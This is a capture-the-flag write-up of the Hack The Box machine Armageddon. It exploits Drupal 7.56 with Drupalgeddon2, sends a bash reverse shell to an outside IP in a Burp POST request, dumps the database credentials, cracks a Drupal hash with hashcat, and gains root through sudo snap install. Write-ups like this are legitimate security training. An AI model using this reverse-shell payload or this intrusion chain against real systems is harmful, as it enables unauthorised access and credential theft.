---
title: "HTB - Armageddon without MetaSploit"
date: 2021-07-31
categories: ["hacking", "write-ups"]
tags: [HTB]
featuredImage: "/images/2021/07/Armageddon_Logo.png"
---
## Intro
During this box, we'll exploit an outdated version of Drupal in order to get an initial shell. This will allow me to discover user credentials on the Drupal DB. Finally, I'll get privesc thanks to an insecure sudo command (once again).

## Target
[HTB - Armageddon](https://app.hackthebox.eu/machines/323)

## Recon
A quick look to the box info reveals it's running Linux.

## Enum
We run our classic `nmap` scan :

```text
sudo nmap -sC -sV -oA scans\armageddon
```
```text
sudo nmap -sC -sV -oA scans/nmap $attacker_ip
 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-08 08:51 CEST
Nmap scan report for $attacker_ip
Host is up (0.025s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.48 seconds
```

The above scans confirms we are facing a Linux box with only Apache and SSH running. 

The `CHANGELOG.txt` shows a `Drupal 7.56` version :

![Drupal Version](/images/2021/07/Armageddon_Drupal_Version.png)

After a quick look on [exploitDB](https://www.exploit-db.com/), we'll notice that this version should be vulnerable to `Drupalgeddon2`.

Let's see!

## Exploitation
NB: I like to use searchsploit directly in my terminal, it makes it easier to show an exploit with `searchsploit -x relative_path` and `searchsploit -m relative_path` in order to mirror (eg. copy the exploit in my current directory).

In our case, we'll be using : `searchsploit -m php/webapps/44449.rb`.

### Getting Initial Shell
After firing it up, we'll get a shell :

![Initial Shell](/images/2021/07/Armageddon_Initial_Shell.png)

From here, we can get the Drupal config inside `sites/default/settings.php` and find `MySQL credentials` :

![MySQL Credentials](/images/2021/07/Armageddon_Mysql_Creds.png)

Once, we have the creds, we can try to dump the db, with `mysqldump`, but we'll gt an error about a bad character (>). We,then, shall upgrade our shell.

Let's fire up `Burp`, with the following request and a `nc listener` :

```text
POST /shell.php HTTP/1.1
Host: $attacker_ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: has_js=1
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 46

c=bash+-i+>%26+/dev/tcp/10.10.14.11/443+0>%261
```

NB : In case you are wondering, I am using the `shell.php` from the exploit, and I simply copy pasted the URL in browser, captured it with Burp, and converted to POST. Then, I could run a better script.

Once it is done, we can dump the DB like so :

`mysqldump -u drupaluser -p drupal > plop.sql`

We now look inside the dump and search for user's information :

![User Info](/images/2021/07/Armageddon_Dump.png)

It appears our user is called `brucetherealadmin` and it's hash starts with `$S$` according to [hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes), it is a Drupal 7 hash, which we can confirm it is!

Now to crack it :

`hashcat -m 7900 arma.hash /usr/share/wordlists/rockyou.txt`

After a little while, the password will be cracked :

![Cracked hash](/images/2021/07/Armageddon_Cracked.png)

### Getting User's Shell

We can now log in via SSH as `brucetherealadmin` with the just cracked password, and grab `user's flag` :

![User Flag](/images/2021/07/Armageddon_User_Flag.png)

### PrivEsc
Now that we are in, the first thing I like to do is checking if I have `sudo`'s rights. This might be an easy win and it is a lot quieter than running a script such as `LinPeas`.

Bruce can indeed run `sudo snap install` :

![Bruce sudo](/images/2021/07/Armageddon_Bruce_Sudo.png)

When I first did the box, there was nothing on [GTFObins](https://gtfobins.github.io/), but since there is today, let's do it the easy way!

We simply modify the first line, replacing `id` command with `cat /root/root.txt`. 

Finally, we run it like : `sudo snap install plop_1.0_all.snap --dangerous --devmode` in order to get root's flag:

![Root Flag](/images/2021/07/Armageddon_Root_Flag.png)

## Outro
I remember loving the first part until user... but the last part was just horrible. I hated it ! It was actually so painful, that I didn't take any note on the privesc and didn't even planned to do the writeup... but here I am!